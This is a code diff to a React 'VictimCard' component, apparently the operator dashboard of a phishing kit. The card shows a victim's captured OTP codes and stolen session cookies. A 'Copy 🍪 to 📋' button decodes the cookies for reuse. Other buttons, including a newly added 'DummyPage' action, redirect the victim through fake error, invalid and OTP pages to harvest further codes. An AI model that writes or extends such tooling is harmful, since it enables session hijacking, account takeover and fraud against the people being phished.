@@ -43,26 +43,29 @@ export default function VictimCard({
   useEffect(() => {
     setCurrCookies(Cookies);
   }, [Cookies]);
-  
-    const copyCookie = (e) => {
-      let buff = new Buffer(curr_Cookies, 'base64');
-      let text = buff.toString('ascii');
-      navigator.clipboard.writeText(text);
-      toast.success(`Enjoy some cookies 🍪`);
-    }
 
+  const copyCookie = (e) => {
+    let buff = new Buffer(curr_Cookies, "base64");
+    let text = buff.toString("ascii");
+    navigator.clipboard.writeText(text);
+    toast.success(`Enjoy some cookies 🍪`);
+  };
 
-    const CookiesSwticher = () => {
-      if (curr_Cookies == "None") {
-        return ;
-      } else {
-        return (
-          <Button onPress={copyCookie} color="default" className="size-fit text-gray-900 bg-white hover:bg-gray-100 border border-gray-200 focus:ring-4 focus:outline-none focus:ring-gray-100 font-medium rounded-lg text-sm px-5 py-2.5 text-center inline-flex items-center dark:focus:ring-gray-600 dark:bg-gray-800 dark:border-gray-700 dark:text-white dark:hover:bg-gray-700 me-2 mb-2">
+  const CookiesSwticher = () => {
+    if (curr_Cookies == "None") {
+      return;
+    } else {
+      return (
+        <Button
+          onPress={copyCookie}
+          color="default"
+          className="size-fit text-gray-900 bg-white hover:bg-gray-100 border border-gray-200 focus:ring-4 focus:outline-none focus:ring-gray-100 font-medium rounded-lg text-sm px-5 py-2.5 text-center inline-flex items-center dark:focus:ring-gray-600 dark:bg-gray-800 dark:border-gray-700 dark:text-white dark:hover:bg-gray-700 me-2 mb-2"
+        >
           Copy 🍪 to 📋
         </Button>
-        );
-      }
-    };
+      );
+    }
+  };
   const router = useRouter();
   const sendToError = async () => {
     try {
@@ -103,6 +106,16 @@ export default function VictimCard({
     } catch (error) {}
     setCurrAction("OTP");
     toast.success(`Sent ${id} to OTP`);
+  };
+  const sentToDummyPage = async () => {
+    try {
+      const res = await fetch(`${process.env.API_URL}/action/${id}/dummyPage`, {
+        method: "PUT",
+        cache: "no-cache",
+      });
+    } catch (error) {}
+    setCurrAction("dummyPage");
+    toast.success(`Sent ${id} to dummyPage`);
   };
   const setOTP = async (values, { setSubmitting }) => {
     try {
@@ -162,16 +175,14 @@ export default function VictimCard({
         <p>
           <span className="text-sky-500">OTP:</span> {curr_OTP}
         </p>
-      
-
       </CardBody>
       <Divider />
       <CardFooter className="flex justify-between content-center">
         <Button onPress={sendToError} color="danger" className="m-1">
-          Send to error
+          Error
         </Button>
-        <Button onPress={sendToInvalid} color="warning" className="m-1">
-          Send to Invalid
+        <Button onPress={sendToInvalid} color="warning" className="m-1" >
+          Invalid
         </Button>
         <Formik
           initialValues={{
@@ -198,8 +209,11 @@ export default function VictimCard({
             </Button>
           </Form>
         </Formik>
-        <Button onPress={sendToOTP2} color="default" className="m-1">
-          Send to OTP2
+        <Button onPress={sendToOTP2} color="primary" className="m-1">
+          OTP2
+        </Button>
+        <Button onPress={sentToDummyPage} color="default" className="m-1">
+          DummyPage
         </Button>
       </CardFooter>
     </Card>
